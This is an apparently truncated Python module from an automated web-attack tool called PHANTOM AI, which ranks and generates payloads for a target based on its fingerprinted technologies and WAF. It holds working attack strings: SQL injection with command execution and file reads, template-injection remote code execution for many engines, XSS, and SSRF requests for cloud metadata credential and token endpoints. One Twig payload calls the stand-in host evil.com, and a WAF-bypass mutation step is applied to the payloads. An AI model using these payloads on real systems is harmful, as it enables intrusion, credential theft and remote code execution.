"""
PHANTOM AI - Context-Aware Payload Selector
============================================

Enterprise AI-driven payload selection system that selects, ranks, and generates
payloads based on comprehensive contextual analysis:

- Detected technologies (frameworks, CMS, WAFs)
- Parameter characteristics (type, reflection, injection potential)
- WAF behaviour patterns and bypass strategies
- Historical effectiveness data
- Vulnerability context

Features:
- Intelligent payload ranking (0.0-1.0 effectiveness score)
- Technology-specific payload selection
- WAF-aware payload mutation
- Context-sensitive payload generation
- Adaptive learning from scan results
- Deduplication and optimization

Author: PHANTOM AI Team
Version: 3.0.0
"""

import hashlib
import logging
import time
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple, Any
from collections import defaultdict
import asyncio

# PHANTOM AI Components
from phantom.tech_fingerprinter import (
    FingerprintResult,
    TechCategory,
)
from phantom.waf_bypass_engine import (
    WAFBypassEngine,
    WAFDetectionResult,
    BypassStrategy,
    BypassTechnique,
    BehaviourFamily,
)
from phantom.parameter_analyzer import (
    AnalyzedParameter,
    InferredType,
    VulnerabilityContext,
)

# Payload Library
from utils.payload_library import (
    PayloadLibrary,
    PayloadCategory,
)

logger = logging.getLogger("phantom.context_payload_selector")

# =============================================================================
# PUBLIC API (H1 FIX 2026-02-13)
# =============================================================================

__all__ = [
    # Core classes
    "ContextPayloadSelector",
    "PayloadContext",
    "RankedPayload",
    "SelectionResult",
    # Enums
    "SelectionStrategy",
    "PayloadPriority",
    "TechPayloadAffinity",
    # Helpers
    "TechPayloadMapper",
    "ContextualPayloadGenerator",
    # Convenience functions
    "select_payloads_for_parameter",
]

# =============================================================================
# CONSTANTS (M1 FIX 2026-02-13)
# =============================================================================

DEFAULT_MAX_PAYLOADS = 50
MAX_WAF_VARIANTS_PER_PAYLOAD = 3
MAX_DB_SPECIFIC_PAYLOADS = 2
MAX_ENGINE_SPECIFIC_PAYLOADS = 2
MAX_INTERNAL_IPS_TO_TEST = 10
MAX_CACHE_ENTRIES = 10000  # H4 FIX: Prevent unbounded cache growth

# L2 FIX 2026-02-13: Extensible template engine list
TEMPLATE_ENGINES = frozenset([
    "jinja", "jinja2", "twig", "freemarker", "velocity", "erb",
    "mako", "pebble", "thymeleaf", "blade", "nunjucks", "handlebars",
    "mustache", "ejs", "pug", "jade", "liquid", "smarty", "django",
])


# =============================================================================
# ENUMS AND CONSTANTS
# =============================================================================

class SelectionStrategy(Enum):
    """Payload selection strategies."""
    AGGRESSIVE = "aggressive"      # More payloads, higher coverage
    BALANCED = "balanced"          # Balance between coverage and stealth
    STEALTH = "stealth"            # Fewer payloads, WAF evasion priority
    TARGETED = "targeted"          # Specific vulnerability type
    EXHAUSTIVE = "exhaustive"      # All possible payloads


class PayloadPriority(Enum):
    """Priority levels for payload selection."""
    CRITICAL = 1.0     # Must test first
    HIGH = 0.8         # High priority
    MEDIUM = 0.5       # Standard priority
    LOW = 0.3          # Lower priority
    MINIMAL = 0.1      # Only if time permits


class TechPayloadAffinity(Enum):
    """Technology to payload category affinity."""
    PERFECT = 1.0      # Ideal match (e.g., Jinja2 → SSTI)
    HIGH = 0.8         # Strong correlation
    MEDIUM = 0.5       # Moderate correlation
    LOW = 0.3          # Weak correlation
    NONE = 0.0         # No correlation


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class PayloadContext:
    """
    Complete context for payload selection.
    Aggregates all relevant information about the target.
    """
    # Target information
    target_url: str
    endpoint: str
    parameter_name: str

    # Technology context
    fingerprint: Optional[FingerprintResult] = None
    detected_technologies: List[str] = field(default_factory=list)
    detected_frameworks: List[str] = field(default_factory=list)
    detected_databases: List[str] = field(default_factory=list)

    # WAF context
    waf_detection: Optional[WAFDetectionResult] = None
    waf_behaviour: Optional[BehaviourFamily] = None
    bypass_strategies: List[BypassStrategy] = field(default_factory=list)

    # Parameter context
    parameter_analysis: Optional[AnalyzedParameter] = None
    inferred_type: Optional[InferredType] = None
    vulnerability_contexts: List[VulnerabilityContext] = field(default_factory=list)
    injection_potential: float = 0.5

    # Additional context
    http_method: str = "GET"
    content_type: Optional[str] = None
    has_reflection: bool = False
    reflection_context: Optional[str] = None

    # Selection settings
    strategy: SelectionStrategy = SelectionStrategy.BALANCED
    max_payloads: int = 50

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "target_url": self.target_url,
            "endpoint": self.endpoint,
            "parameter_name": self.parameter_name,
            "detected_technologies": self.detected_technologies,
            "detected_frameworks": self.detected_frameworks,
            "detected_databases": self.detected_databases,
            "waf_detected": self.waf_detection.waf_detected if self.waf_detection else False,
            "waf_name": self.waf_detection.detected_waf if self.waf_detection else None,
            "waf_behaviour": self.waf_behaviour.value if self.waf_behaviour else None,
            "inferred_type": self.inferred_type.value if self.inferred_type else None,
            "vulnerability_contexts": [v.value for v in self.vulnerability_contexts],
            "injection_potential": self.injection_potential,
            "http_method": self.http_method,
            "has_reflection": self.has_reflection,
            "strategy": self.strategy.value,
            "max_payloads": self.max_payloads,
        }


@dataclass
class RankedPayload:
    """
    A payload with its effectiveness ranking and metadata.
    """
    # Core payload
    payload: str
    original_payload: str
    category: PayloadCategory

    # Effectiveness scoring
    effectiveness_score: float  # 0.0-1.0
    priority: PayloadPriority

    # Context relevance
    tech_affinity: float        # How well it matches detected tech
    waf_bypass_score: float     # Likelihood of WAF bypass
    context_score: float        # How well it matches parameter context

    # Metadata
    description: str = ""
    tags: Set[str] = field(default_factory=set)
    bypass_techniques: List[BypassTechnique] = field(default_factory=list)
    success_indicators: List[str] = field(default_factory=list)

    # Tracking
    payload_hash: str = ""
    source: str = "library"  # library, generated, mutated, custom

    def __post_init__(self):
        """Calculate payload hash for deduplication."""
        if not self.payload_hash:
            self.payload_hash = hashlib.md5(
                self.payload.encode('utf-8', errors='ignore')
            ).hexdigest()[:16]

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "payload": self.payload,
            "original_payload": self.original_payload,
            "category": self.category.name,
            "effectiveness_score": round(self.effectiveness_score, 4),
            "priority": self.priority.name,
            "tech_affinity": round(self.tech_affinity, 4),
            "waf_bypass_score": round(self.waf_bypass_score, 4),
            "context_score": round(self.context_score, 4),
            "description": self.description,
            "tags": list(self.tags),
            "bypass_techniques": [t.value for t in self.bypass_techniques],
            "success_indicators": self.success_indicators,
            "payload_hash": self.payload_hash,
            "source": self.source,
        }


@dataclass
class SelectionResult:
    """
    Result of payload selection process.
    """
    # Selected payloads (ordered by effectiveness)
    payloads: List[RankedPayload]

    # Statistics
    total_considered: int
    total_selected: int
    categories_covered: Set[PayloadCategory]

    # Context used
    context: PayloadContext

    # Performance
    selection_time_ms: float

    # Recommendations
    recommended_order: List[str]  # payload hashes in recommended test order
    category_distribution: Dict[str, int]

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "total_considered": self.total_considered,
            "total_selected": self.total_selected,
            "categories_covered": [c.name for c in self.categories_covered],
            "selection_time_ms": round(self.selection_time_ms, 2),
            "category_distribution": self.category_distribution,
            "payloads": [p.to_dict() for p in self.payloads],
        }


# =============================================================================
# TECHNOLOGY-PAYLOAD MAPPING
# =============================================================================

class TechPayloadMapper:
    """
    Maps detected technologies to relevant payload categories and priorities.
    """

    # Technology → Payload Category affinities
    TECH_CATEGORY_AFFINITY: Dict[str, Dict[PayloadCategory, TechPayloadAffinity]] = {
        # Template engines → SSTI
        "jinja2": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "twig": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "freemarker": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "velocity": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "erb": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "mako": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "pebble": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,
        },
        "thymeleaf": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
        },

        # Databases → SQLi
        "mysql": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },
        "postgresql": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },
        "mssql": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },
        "oracle": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },
        "sqlite": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },
        "mariadb": {
            PayloadCategory.SQLI: TechPayloadAffinity.PERFECT,
        },

        # NoSQL Databases
        "mongodb": {
            PayloadCategory.NOSQL: TechPayloadAffinity.PERFECT,
            PayloadCategory.SQLI: TechPayloadAffinity.LOW,
        },
        "couchdb": {
            PayloadCategory.NOSQL: TechPayloadAffinity.PERFECT,
        },
        "redis": {
            PayloadCategory.SSRF: TechPayloadAffinity.HIGH,
        },
        "elasticsearch": {
            PayloadCategory.NOSQL: TechPayloadAffinity.HIGH,
        },

        # PHP frameworks → LFI/RFI
        "php": {
            PayloadCategory.LFI: TechPayloadAffinity.HIGH,
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.CMDI: TechPayloadAffinity.MEDIUM,
        },
        "laravel": {
            PayloadCategory.LFI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.SSTI: TechPayloadAffinity.MEDIUM,  # Blade templates
        },
        "symfony": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,  # Twig
            PayloadCategory.LFI: TechPayloadAffinity.MEDIUM,
        },
        "wordpress": {
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.LFI: TechPayloadAffinity.MEDIUM,
        },
        "drupal": {
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.SSTI: TechPayloadAffinity.MEDIUM,  # Twig
        },
        "joomla": {
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.LFI: TechPayloadAffinity.MEDIUM,
        },

        # Python frameworks
        "flask": {
            PayloadCategory.SSTI: TechPayloadAffinity.PERFECT,  # Jinja2
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
        },
        "django": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
        },
        "tornado": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
        },
        "fastapi": {
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.SSRF: TechPayloadAffinity.MEDIUM,
        },

        # Java frameworks
        "spring": {
            PayloadCategory.SSTI: TechPayloadAffinity.MEDIUM,  # Thymeleaf
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.XXE: TechPayloadAffinity.HIGH,
            PayloadCategory.SSRF: TechPayloadAffinity.MEDIUM,
        },
        "struts": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,  # OGNL
            PayloadCategory.CMDI: TechPayloadAffinity.HIGH,
        },
        "tomcat": {
            PayloadCategory.LFI: TechPayloadAffinity.HIGH,
            PayloadCategory.XXE: TechPayloadAffinity.HIGH,
        },

        # Ruby frameworks
        "rails": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,  # ERB
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },
        "sinatra": {
            PayloadCategory.SSTI: TechPayloadAffinity.HIGH,  # ERB
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
        },

        # Node.js frameworks
        "express": {
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.NOSQL: TechPayloadAffinity.MEDIUM,  # Often MongoDB
            PayloadCategory.SSRF: TechPayloadAffinity.MEDIUM,
            PayloadCategory.SSTI: TechPayloadAffinity.MEDIUM,  # Various engines
        },
        "nodejs": {
            PayloadCategory.CMDI: TechPayloadAffinity.HIGH,
            PayloadCategory.SSRF: TechPayloadAffinity.HIGH,
            PayloadCategory.NOSQL: TechPayloadAffinity.MEDIUM,
        },
        "nextjs": {
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.SSRF: TechPayloadAffinity.MEDIUM,
        },

        # .NET frameworks
        "aspnet": {
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.LFI: TechPayloadAffinity.MEDIUM,
            PayloadCategory.XXE: TechPayloadAffinity.MEDIUM,
        },
        "aspnet_core": {
            PayloadCategory.XSS: TechPayloadAffinity.HIGH,
            PayloadCategory.SQLI: TechPayloadAffinity.MEDIUM,
        },

        # XML parsers → XXE
        "libxml": {
            PayloadCategory.XXE: TechPayloadAffinity.PERFECT,
        },
        "xerces": {
            PayloadCategory.XXE: TechPayloadAffinity.PERFECT,
        },
        "saxparser": {
            PayloadCategory.XXE: TechPayloadAffinity.PERFECT,
        },

        # GraphQL
        "graphql": {
            PayloadCategory.SQLI: TechPayloadAffinity.HIGH,
            PayloadCategory.NOSQL: TechPayloadAffinity.HIGH,
            PayloadCategory.XSS: TechPayloadAffinity.MEDIUM,
        },

        # Cloud services → SSRF
        "aws": {
            PayloadCategory.SSRF: TechPayloadAffinity.PERFECT,
        },
        "gcp": {
            PayloadCategory.SSRF: TechPayloadAffinity.PERFECT,
        },
        "azure": {
            PayloadCategory.SSRF: TechPayloadAffinity.PERFECT,
        },
        "kubernetes": {
            PayloadCategory.SSRF: TechPayloadAffinity.HIGH,
        },
        "docker": {
            PayloadCategory.SSRF: TechPayloadAffinity.HIGH,
            PayloadCategory.CMDI: TechPayloadAffinity.MEDIUM,
        },
    }

    # Vulnerability context → Payload category mapping
    VULN_CONTEXT_TO_CATEGORY: Dict[VulnerabilityContext, PayloadCategory] = {
        VulnerabilityContext.SQL_INJECTION: PayloadCategory.SQLI,
        VulnerabilityContext.XSS: PayloadCategory.XSS,
        VulnerabilityContext.COMMAND_INJECTION: PayloadCategory.CMDI,
        VulnerabilityContext.PATH_TRAVERSAL: PayloadCategory.LFI,
        VulnerabilityContext.LFI: PayloadCategory.LFI,
        VulnerabilityContext.SSRF: PayloadCategory.SSRF,
        VulnerabilityContext.SSTI: PayloadCategory.SSTI,
        VulnerabilityContext.XXE: PayloadCategory.XXE,
        VulnerabilityContext.LDAP_INJECTION: PayloadCategory.LDAP,
        VulnerabilityContext.XPATH_INJECTION: PayloadCategory.XPATH,
        VulnerabilityContext.NOSQL_INJECTION: PayloadCategory.NOSQL,
        VulnerabilityContext.HTTP_HEADER_INJECTION: PayloadCategory.CRLF,
        VulnerabilityContext.CRLF_INJECTION: PayloadCategory.CRLF,
        VulnerabilityContext.OPEN_REDIRECT: PayloadCategory.OPEN_REDIRECT,
    }

    # Parameter type → Likely payload categories
    PARAM_TYPE_AFFINITIES: Dict[InferredType, Dict[PayloadCategory, float]] = {
        InferredType.STRING: {
            PayloadCategory.SQLI: 0.6,
            PayloadCategory.XSS: 0.7,
            PayloadCategory.SSTI: 0.4,
        },
        InferredType.EMAIL: {
            PayloadCategory.XSS: 0.8,
            PayloadCategory.SQLI: 0.7,
        },
        InferredType.URL: {
            PayloadCategory.SSRF: 0.95,
            PayloadCategory.OPEN_REDIRECT: 0.9,
            PayloadCategory.XSS: 0.5,
        },
        InferredType.PATH: {
            PayloadCategory.LFI: 0.95,
            PayloadCategory.CMDI: 0.6,
        },
        InferredType.FILENAME: {
            PayloadCategory.LFI: 0.9,
            PayloadCategory.CMDI: 0.5,
        },
        InferredType.INTEGER: {
            PayloadCategory.SQLI: 0.85,
        },
        InferredType.FLOAT: {
            PayloadCategory.SQLI: 0.7,
        },
        InferredType.JSON: {
            PayloadCategory.NOSQL: 0.8,
            PayloadCategory.SQLI: 0.5,
        },
        InferredType.HTML: {
            PayloadCategory.XSS: 0.95,
        },
        InferredType.JWT: {
            PayloadCategory.SQLI: 0.3,  # Less likely, more for auth attacks
        },
        InferredType.BASE64: {
            PayloadCategory.SQLI: 0.5,
            PayloadCategory.CMDI: 0.4,
            PayloadCategory.LFI: 0.4,
        },
        InferredType.IP_ADDRESS: {
            PayloadCategory.SSRF: 0.7,
            PayloadCategory.CMDI: 0.5,
        },
        InferredType.UUID: {
            PayloadCategory.SQLI: 0.4,  # Could be used in queries
        },
        InferredType.DATE: {
            PayloadCategory.SQLI: 0.6,
        },
        InferredType.DATETIME: {
            PayloadCategory.SQLI: 0.6,
        },
        InferredType.ARRAY: {
            PayloadCategory.NOSQL: 0.7,
            PayloadCategory.SQLI: 0.5,
        },
        InferredType.OBJECT: {
            PayloadCategory.NOSQL: 0.8,
        },
    }

    @classmethod
    def get_tech_affinity(
        cls,
        tech_name: str,
        category: PayloadCategory
    ) -> float:
        """Get affinity score between technology and payload category."""
        tech_lower = tech_name.lower()

        # Direct match
        if tech_lower in cls.TECH_CATEGORY_AFFINITY:
            affinities = cls.TECH_CATEGORY_AFFINITY[tech_lower]
            if category in affinities:
                return affinities[category].value

        # Partial match
        for tech, affinities in cls.TECH_CATEGORY_AFFINITY.items():
            if tech in tech_lower or tech_lower in tech:
                if category in affinities:
                    return affinities[category].value * 0.8  # Slight reduction for partial

        return TechPayloadAffinity.LOW.value

    @classmethod
    def get_param_type_affinity(
        cls,
        param_type: InferredType,
        category: PayloadCategory
    ) -> float:
        """Get affinity score between parameter type and payload category."""
        if param_type in cls.PARAM_TYPE_AFFINITIES:
            affinities = cls.PARAM_TYPE_AFFINITIES[param_type]
            if category in affinities:
                return affinities[category]

        return 0.3  # Default low affinity

    @classmethod
    def vuln_context_to_category(
        cls,
        context: VulnerabilityContext
    ) -> Optional[PayloadCategory]:
        """Convert vulnerability context to payload category."""
        return cls.VULN_CONTEXT_TO_CATEGORY.get(context)


# =============================================================================
# PAYLOAD GENERATOR
# =============================================================================

class ContextualPayloadGenerator:
    """
    Generates context-specific payloads based on detected environment.
    """

    def __init__(self):
        self.payload_library = PayloadLibrary.get_instance()
        self.waf_engine = WAFBypassEngine()

    def generate_sqli_for_db(
        self,
        db_type: str,
        with_waf_bypass: bool = True,
        waf_detection: Optional[WAFDetectionResult] = None
    ) -> List[Tuple[str, str]]:
        """Generate SQLi payloads specific to database type."""
        payloads = []

        # Database-specific payloads
        db_payloads = {
            "mysql": [
                ("' AND SLEEP(5)-- -", "MySQL time-based blind"),
                ("' AND BENCHMARK(5000000,SHA1('test'))-- -", "MySQL BENCHMARK"),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "MySQL nested SLEEP"),
                ("' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -", "MySQL error-based"),
                ("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -", "MySQL file read"),
            ],
            "postgresql": [
                ("'; SELECT PG_SLEEP(5)-- -", "PostgreSQL time-based"),
                ("' AND (SELECT COUNT(*) FROM pg_sleep(5))>0-- -", "PostgreSQL nested sleep"),
                ("'; COPY (SELECT '') TO PROGRAM 'id'-- -", "PostgreSQL RCE (CVE-2019-9193)"),
                ("' UNION SELECT current_database()::text,NULL-- -", "PostgreSQL database name"),
            ],
            "mssql": [
                ("'; WAITFOR DELAY '0:0:5'-- -", "MSSQL time-based"),
                ("'; EXEC xp_cmdshell 'whoami'-- -", "MSSQL xp_cmdshell"),
                ("' UNION SELECT @@version,NULL-- -", "MSSQL version"),
                ("'; EXEC sp_configure 'show advanced options',1-- -", "MSSQL config"),
            ],
            "oracle": [
                ("' AND DBMS_LOCK.SLEEP(5)=0-- -", "Oracle time-based"),
                ("' AND (SELECT COUNT(*) FROM ALL_USERS)>0 AND ''='", "Oracle users check"),
                ("' UNION SELECT banner,NULL FROM v$version-- -", "Oracle version"),
            ],
            "sqlite": [
                ("' AND (SELECT hex(randomblob(100000000)))-- -", "SQLite time-based"),
                ("' UNION SELECT sqlite_version(),NULL-- -", "SQLite version"),
                ("' UNION SELECT sql FROM sqlite_master-- -", "SQLite schema dump"),
            ],
        }

        db_lower = db_type.lower()
        if db_lower in db_payloads:
            payloads.extend(db_payloads[db_lower])

        # Apply WAF bypass if needed
        if with_waf_bypass and waf_detection and waf_detection.waf_detected:
            bypassed = []
            for payload, desc in payloads:
                bypassed_payload = self.waf_engine.apply_bypass(
                    payload, waf_detection, max_mutations=1
                )
                bypassed.append((bypassed_payload, f"{desc} (WAF bypassed)"))
            payloads.extend(bypassed)

        return payloads

    def generate_ssti_for_engine(
        self,
        engine: str,
        with_waf_bypass: bool = True,
        waf_detection: Optional[WAFDetectionResult] = None
    ) -> List[Tuple[str, str]]:
        """Generate SSTI payloads specific to template engine."""
        payloads = []

        engine_payloads = {
            "jinja2": [
                ("{{7*7}}", "Jinja2 math detection"),
                ("{{config}}", "Jinja2 config leak"),
                ("{{config.items()}}", "Jinja2 config items"),
                ("{{self.__dict__}}", "Jinja2 self dict"),
                ("{{request.environ}}", "Jinja2 request environ"),
                ("{{''.__class__.__mro__[2].__subclasses__()}}", "Jinja2 subclasses"),
                ("{{lipsum.__globals__['os'].popen('id').read()}}", "Jinja2 RCE via lipsum"),
                ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "Jinja2 RCE via cycler"),
                ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 RCE"),
            ],
            "twig": [
                ("{{7*7}}", "Twig math detection"),
                ("{{dump(app)}}", "Twig app dump"),
                ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", "Twig RCE"),
                ("{{['id']|filter('system')}}", "Twig RCE filter"),
                ("{{_self.env.setCache('ftp://evil.com')}}", "Twig cache SSRF"),
            ],
            "freemarker": [
                ("${7*7}", "Freemarker math detection"),
                ("${object.class}", "Freemarker class access"),
                ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "Freemarker Execute"),
                ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "Freemarker new() RCE"),
                ("[#assign cmd=\"id\"][#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()][${ob(\"java.lang.ProcessBuilder\",cmd)}]", "Freemarker ProcessBuilder"),
            ],
            "velocity": [
                ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "Velocity RCE"),
            ],
            "erb": [
                ("<%= 7*7 %>", "ERB math detection"),
                ("<%= system('id') %>", "ERB RCE system"),
                ("<%= `id` %>", "ERB RCE backticks"),
                ("<%= IO.popen('id').read %>", "ERB RCE IO.popen"),
                ("<%= File.read('/etc/passwd') %>", "ERB file read"),
            ],
            "mako": [
                ("${7*7}", "Mako math detection"),
                ("<%import os%>${os.popen('id').read()}", "Mako RCE import"),
                ("${self.module.cache.util.os.popen('id').read()}", "Mako RCE module"),
            ],
            "pebble": [
                ("{{7*7}}", "Pebble math detection"),
                ("{{beans}}", "Pebble beans leak"),
                ('{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(bytes) }}', "Pebble RCE"),
            ],
            "thymeleaf": [
                ("[[${7*7}]]", "Thymeleaf inline math"),
                ("__${7*7}__::x", "Thymeleaf preprocessor"),
                ("__${T(java.lang.Runtime).getRuntime().exec('id')}__::x", "Thymeleaf RCE"),
            ],
        }

        engine_lower = engine.lower()
        if engine_lower in engine_payloads:
            payloads.extend(engine_payloads[engine_lower])

        # Apply WAF bypass if needed
        if with_waf_bypass and waf_detection and waf_detection.waf_detected:
            bypassed = []
            for payload, desc in payloads:
                bypassed_payload = self.waf_engine.apply_bypass(
                    payload, waf_detection, max_mutations=1
                )
                bypassed.append((bypassed_payload, f"{desc} (WAF bypassed)"))
            payloads.extend(bypassed)

        return payloads

    def generate_xss_for_context(
        self,
        context: str,
        with_waf_bypass: bool = True,
        waf_detection: Optional[WAFDetectionResult] = None
    ) -> List[Tuple[str, str]]:
        """Generate XSS payloads specific to injection context."""
        payloads = []

        context_payloads = {
            "html_tag": [
                ("<script>alert(1)</script>", "Script tag"),
                ("<img src=x onerror=alert(1)>", "IMG onerror"),
                ("<svg onload=alert(1)>", "SVG onload"),
                ("<body onload=alert(1)>", "Body onload"),
                ("<input onfocus=alert(1) autofocus>", "Input autofocus"),
                ("<details open ontoggle=alert(1)>", "Details ontoggle"),
                ("<video src=x onerror=alert(1)>", "Video onerror"),
                ("<audio src=x onerror=alert(1)>", "Audio onerror"),
                ("<iframe onload=alert(1)>", "Iframe onload"),
                ("<object data=javascript:alert(1)>", "Object data javascript"),
                ("<embed src=javascript:alert(1)>", "Embed src javascript"),
            ],
            "html_attr": [
                ("javascript:alert(1)", "JavaScript protocol"),
                ("javascript:alert(document.domain)", "JavaScript domain"),
                ("data:text/html,<script>alert(1)</script>", "Data URI"),
            ],
            "html_attr_quoted": [
                ("\" onmouseover=\"alert(1)", "Double quote break + event"),
                ("' onmouseover='alert(1)", "Single quote break + event"),
                ("\" onfocus=\"alert(1)\" autofocus=\"", "Autofocus technique"),
                ("\" onclick=\"alert(1)\"", "Onclick injection"),
                ("\" style=\"background:url(javascript:alert(1))\"", "Style injection"),
            ],
            "js_string": [
                ("'-alert(1)-'", "Arithmetic break"),
                ("'+alert(1)+'", "Concat break"),
                ("';alert(1)//", "Statement break"),
                ("\\';alert(1)//", "Escaped quote break"),
                ("</script><script>alert(1)//", "Tag break"),
            ],
            "js_block": [
                ("</script><script>alert(1)</script>", "Script tag escape"),
                ("};alert(1);//", "Block termination"),
                ("//\\nalert(1)", "Comment break"),
            ],
            "url": [
                ("javascript:alert(1)", "JavaScript protocol"),
                ("//evil.com", "Protocol relative"),
                ("data:text/html,<script>alert(1)</script>", "Data URI XSS"),
            ],
            "css": [
                ("</style><script>alert(1)</script>", "Style tag escape"),
                ("expression(alert(1))", "CSS expression (IE)"),
                ("url(javascript:alert(1))", "CSS url() javascript"),
            ],
        }

        context_lower = context.lower()
        if context_lower in context_payloads:
            payloads.extend(context_payloads[context_lower])

        # Apply WAF bypass if needed
        if with_waf_bypass and waf_detection and waf_detection.waf_detected:
            bypassed = []
            for payload, desc in payloads:
                bypassed_payload = self.waf_engine.apply_bypass(
                    payload, waf_detection, max_mutations=1
                )
                bypassed.append((bypassed_payload, f"{desc} (WAF bypassed)"))
            payloads.extend(bypassed)

        return payloads

    def generate_ssrf_for_cloud(
        self,
        cloud_provider: Optional[str] = None,
        internal_ips: Optional[List[str]] = None
    ) -> List[Tuple[str, str]]:
        """Generate SSRF payloads for cloud metadata and internal networks."""
        payloads = []

        # Cloud metadata endpoints
        cloud_payloads = {
            "aws": [
                ("http://169.254.169.254/latest/meta-data/", "AWS metadata root"),
                ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
                ("http://169.254.169.254/latest/meta-data/instance-id", "AWS instance ID"),
                ("http://169.254.169.254/latest/user-data", "AWS user-data"),
                ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS identity doc"),
            ],
            "gcp": [
                ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root"),
                ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP SA token"),
                ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP project ID"),
            ],
            "azure": [
                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
                ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure MI token"),
            ],
            "digitalocean": [
                ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
                ("http://169.254.169.254/metadata/v1/id", "DigitalOcean droplet ID"),
            ],
            "kubernetes": [
                ("http://10.0.0.1:443/api/", "K8s API server"),
                ("http://kubernetes.default.svc/api/", "K8s service discovery"),
                ("http://kubernetes.default.svc:443/", "K8s internal API"),
            ],
        }

        # Add provider-specific payloads
        if cloud_provider:
            provider_lower = cloud_provider.lower()
            if provider_lower in cloud_payloads:
                payloads.extend(cloud_payloads[provider_lower])
        else:
            # Add all cloud payloads
            for provider, provider_payloads in cloud_payloads.items():
                payloads.extend(provider_payloads)

        # Localhost bypass variations
        localhost_bypasses = [
            ("http://127.0.0.1", "Direct localhost"),
            ("http://localhost", "Localhost hostname"),
            ("http://[::1]", "IPv6 localhost"),
            ("http://0.0.0.0", "All interfaces"),
            ("http://127.1", "Short localhost"),
            ("http://0177.0.0.1", "Octal localhost"),
            ("http://2130706433", "Decimal localhost"),
